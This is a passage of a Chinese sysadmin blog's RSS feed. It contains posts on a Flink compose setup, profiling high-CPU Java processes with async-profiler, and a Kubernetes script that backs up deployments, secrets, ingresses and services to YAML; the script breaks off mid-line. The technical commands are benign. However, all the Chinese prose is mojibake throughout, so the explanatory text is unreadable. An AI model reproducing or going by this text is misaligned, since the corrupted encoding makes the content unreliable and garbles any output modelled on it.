&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        jobmanager.rpc.address: jobmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    deploy:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          replicas: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æµ‹è¯•ç¯å¢ƒçš„å†…å­˜å°±å›§å¤šäº†ï¼Œjobmanageråªç»™äº†2Gï¼Œä½†æ˜¯ä»»åŠ¡å¤šä¸”å¤§ï¼Œ8Gå’ŒSlotç»™äº†4ï¼Œè¿™ä¸ªå€¼æ˜¯ä¸æ–­å¤±è´¥ç„¶åä¿®æ”¹å¾—åˆ°çš„&lt;/p&gt;</description>
    </item>
    <item>
      <title>Javaè¿›ç¨‹cpué«˜æ’æŸ¥</title>
      <link>https://rendoumi.com/posts/20251117-java_profile/</link>
      <pubDate>Mon, 17 Nov 2025 09:02:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251117-java_profile/</guid>
      <description>&lt;p&gt;æ²¡åŠæ³•äº†ï¼Œè¢«è¿ç»­é—®åˆ°è¿™ä¸ªé—®é¢˜ï¼Œå¿…é¡»è®²ä¸€ä¸‹äº†&lt;/p&gt;
&lt;p&gt;javaç¨‹åºå†™å¾—ä¸å¥½ï¼Œè¦ä¹ˆcpué«˜ï¼Œè¦ä¹ˆå†…å­˜é«˜ï¼Œå†…å­˜å¯ä»¥ä¸æ–­æ‰©å¤§ï¼Œæˆ‘ä»¬çš„æŸä¸ªpodï¼Œå·²ç»æ‰©åˆ°8Gäº†ï¼Œnodeæ€»å…±æ‰16Gï¼Œæ— è¯­å•Šã€‚&lt;/p&gt;
&lt;p&gt;é‚£ç©¶ç«Ÿç”¨å•¥ç©æ„æ¥æ’æŸ¥å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;é‚£å¿…é¡»æ¨è&lt;code&gt;async-profiler&lt;/code&gt;äº†&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œè¿è¡Œæ’æŸ¥å³å¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /opt/app/profiler
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/async-profiler/async-profiler/releases/download/v4.2/async-profiler-4.2-linux-x64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf async-profiler-4.2-linux-x64.tar.gz -C /opt/app/profiler --strip-components&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‘½ä»¤å¾ˆç®€å•ï¼Œå…³é”®æ˜¯å‚æ•°-eçš„é€‰æ‹©ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;é«˜ CPU å ç”¨ (CPU-Bound)ï¼Ÿç¼ºçœå‚æ•°&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;é¦–é€‰ï¼š&lt;/strong&gt; &lt;code&gt;-e cpu&lt;/code&gt; æˆ– &lt;code&gt;-e cycles&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç›®æ ‡ï¼š&lt;/strong&gt; æŸ¥çœ‹ç«ç„°å›¾é¡¶ç«¯æœ€å®½çš„æ–¹æ³•ï¼Œå³æ¶ˆè€— CPU æœ€å¤šçš„è®¡ç®—ä»£ç ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;I/O é˜»å¡ã€é”ç­‰å¾…æˆ–åº”ç”¨å‡æ­» (Latency/Blocking-Bound)ï¼Ÿ&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;é¦–é€‰ï¼š&lt;/strong&gt; &lt;code&gt;-e wall&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç›®æ ‡ï¼š&lt;/strong&gt; æŸ¥æ‰¾ç«ç„°å›¾é¡¶ç«¯é•¿æ—¶é—´å¤„äº &lt;code&gt;BLOCKED&lt;/code&gt; æˆ– I/O ç›¸å…³çš„ä»£ç å—ï¼Œæ‰¾å‡ºé˜»å¡çš„æ ¹æºã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;é¢‘ç¹ GC æˆ–å†…å­˜æ¶ˆè€—è¿‡å¿«ï¼Ÿ&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;é¦–é€‰ï¼š&lt;/strong&gt; &lt;code&gt;-e alloc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç›®æ ‡ï¼š&lt;/strong&gt; æ‰¾å‡ºå“ªäº›æ–¹æ³•åœ¨çŸ­æ—¶é—´å†…åˆ›å»ºäº†å¤§é‡å¯¹è±¡ï¼Œå¯¼è‡´å¹´è½»ä»£ GC é¢‘ç¹ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ˜ç¡®æ€€ç–‘é”ç«äº‰ï¼Ÿ&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;é¦–é€‰ï¼š&lt;/strong&gt; &lt;code&gt;-e lock&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç›®æ ‡ï¼š&lt;/strong&gt; å‡†ç¡®æ‰¾å‡ºå“ªä¸ªé”æ˜¯ä¸»è¦çš„ç«äº‰ç‚¹ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é‚£ç¡®å®šç›®æ ‡ï¼Œcpuæ˜¯ç¼ºçœå‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿è¡Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./asprof -d &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; -f 1.html &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šï¼Œ-d åˆ†æå®è·µ30ç§’ï¼Œ-fè¾“å‡ºçš„æ–‡ä»¶ï¼Œæœ€åçš„1æ˜¯javaçš„è¿›ç¨‹å·ï¼Œè¿™æ ·å°±ç”Ÿæˆäº†ä¸€ä¸ª1.htmlçš„æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;æ‰“å¼€çœ‹çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251117163547425&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251117-java_profile/image-20251117163547425.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kubernetesä¸‹å„ç§èµ„æºçš„æ¯æ—¥å®šæœŸå¤‡ä»½</title>
      <link>https://rendoumi.com/posts/20251117-k8s_resource_backup/</link>
      <pubDate>Mon, 17 Nov 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251117-k8s_resource_backup/</guid>
      <description>&lt;p&gt;è¿™ä¸ªé—®é¢˜å…¶å®æ¯”è¾ƒæœ‰æ„æ€ï¼ŒåŒäº‹æ—©ä¸Šç”¨k9sä¿®æ”¹Deploymentçš„æ—¶å€™è¯¯åˆ äº†ä¸€ä¸ªdeploymentï¼Œè¿™ä¸‹éº»çƒ¦äº†ã€‚é‚£å…¶å®è‡ªå·±ä¹Ÿæœ‰è¿‡ç±»ä¼¼æ“ä½œï¼Œè¿ç§»çš„æ—¶å€™è¯¯åˆ è¿‡influxdbï¼Œæœ€åè€ƒå¤æ‰å¼„å›æ¥ï¼Œä¹Ÿè¯¯åˆ è¿‡ä¸€ä¸ªnsçš„secretï¼Œéƒ½æ˜¯å¤§éº»çƒ¦ï¼&lt;/p&gt;
&lt;p&gt;å…¶å®ç³»ç»Ÿæ˜¯æœ‰veleroå¤‡ä»½çš„ï¼Œä½†æ˜¯ä»é‚£é‡Œé¢å»å¼„å‡ºå•ç‹¬ä¸€ä¸ªnsçš„deployè¿›è¡Œæ¢å¤ï¼Œæ€ä¹ˆä¹Ÿæ¥ä¸åŠï¼Œé‚£å¹¸å¥½æœ‰æ¯æ—¥èµ„æºå¤‡ä»½ï¼Œç›´æ¥æ‹¿è¿‡æ¥é‡å»ºå³å¯ã€‚åˆ†äº«ä¸€ä¸‹è„šæœ¬ï¼Œé‚£æ³¨æ„ä¸€ä¸‹ï¼Œå› ä¸ºä¸»èŠ‚ç‚¹çš„etcdä¹Ÿæ˜¯éå¸¸è¦å‘½çš„ä¸œè¥¿ï¼Œä¹Ÿå¿…é¡»å¤‡ä¸€ä¸‹ï¼Œé˜²æ­¢ä¸»èŠ‚ç‚¹è„‘è£‚ï¼Œåˆ°æ—¶å€™å¯ä»¥ç”¨å¤‡ä»½è¿›è¡Œæ¢å¤ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KUBECONFIG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/root/.kube/config
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/bin:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# K8s èµ„æºå¤‡ä»½è„šæœ¬&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç›®æ ‡ï¼šéå†æ‰€æœ‰å‘½åç©ºé—´ï¼Œå°† Deployment, Secret, Ingress, å’Œ Service å¯¼å‡ºä¸º YAML æ–‡ä»¶ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è®¾ç½®è¾“å‡ºç›®å½•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;OUTPUT_DIR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/k8s_deployments_backup/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date +%Y%m%d&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¦å¤‡ä»½çš„èµ„æºç±»å‹åŠå…¶å¯¹åº”çš„ kubectl åˆ«å&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ³¨æ„ï¼šSecret èµ„æºä¼šå¤‡ä»½æ‰€æœ‰ç±»å‹ï¼ŒåŒ…æ‹¬è‡ªåŠ¨ç”Ÿæˆçš„ Service Account Tokensã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;RESOURCE_TYPES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;deployments&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;secrets&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ingresses&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;services&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç¡®ä¿è„šæœ¬åœ¨é‡åˆ°é”™è¯¯æ—¶ç«‹å³é€€å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; -e
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--- æ­£åœ¨åˆ›å»ºè¾“å‡ºç›®å½•: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$OUTPUT_DIR&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ---&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$OUTPUT_DIR&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ----------------------------------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ ¸å¿ƒå‡½æ•°ï¼šå¤‡ä»½æŒ‡å®šç±»å‹çš„èµ„æº&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‚æ•°: $1 = èµ„æºç±»å‹ (å¦‚ deployment), $2 = å‘½åç©ºé—´, $3 = è¾“å‡ºç›®å½•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ----------------------------------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;backup_resource&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;NAMESPACE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;DIR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# è·å–å½“å‰å‘½åç©ºé—´ä¸­æ‰€æœ‰è¯¥ç±»å‹èµ„æºçš„åç§°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# ä½¿ç”¨ 2&amp;gt;/dev/null éšè—æ‰¾ä¸åˆ°èµ„æºæ—¶çš„é”™è¯¯ä¿¡æ¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;RESOURCES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;kubectl get &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TYPE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NAMESPACE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -o &lt;span class=&#34;nv&#34;&gt;jsonpath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{.items[*].metadata.name}&amp;#39;&lt;/span&gt; 2&amp;gt;/dev/null&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -z &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$RESOURCES&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;  [ä¿¡æ¯] å‘½åç©ºé—´ &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NAMESPACE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ä¸­æœªæ‰¾åˆ° &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TYPE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;  -&amp;gt; æ‰¾åˆ° &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${#&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;RESOURCES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[@]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ä¸ª &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TYPE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;ï¼Œæ­£åœ¨å¯¼å‡º...&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# éå†æ¯ä¸ªèµ„æºå¹¶ä¿å­˜ YAML&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; RESOURCE in &lt;span class=&#34;nv&#34;&gt;$RESOURCES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;# æ–‡ä»¶åæ ¼å¼: namespace-resource_type-resourcename.yaml&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;FILE_NAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;NAMESPACE&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;RESOURCE&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.yaml&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;FILE_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DIR&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$FILE_NAME&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;# ä½¿ç”¨ kubectl get è·å– YAMLï¼Œå¹¶é€šè¿‡ç®¡é“å’Œ sed æ¸…ç†å…ƒæ•°æ®å­—æ®µ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        kubectl get &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TYPE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$RESOURCE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NAMESPACE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -o yaml --ignore-not-found &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;c1&#34;&gt;# æ¸…ç†å…ƒæ•°æ®å­—æ®µï¼Œä½¿ YAML æ›´å¹²å‡€ï¼Œä¾¿äºé‡æ–°åº”ç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          sed &lt;span class=&#34;s1&#34;&gt;&amp;#39;/^  creationTimestamp:/d&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          sed &lt;span class=&#34;s1&#34;&gt;&amp;#39;/^  resourceVersion:/d&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          sed &lt;span class=&#34;s1&#34;&gt;&amp;#39;/^  uid:/d&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          sed &lt;span class=&#34;s1&#34;&gt;&amp;#39;/^  selfLink:/d&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          sed &lt;span class=&#34;s1&#34;&gt;&amp;#39;/^  status:/d&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
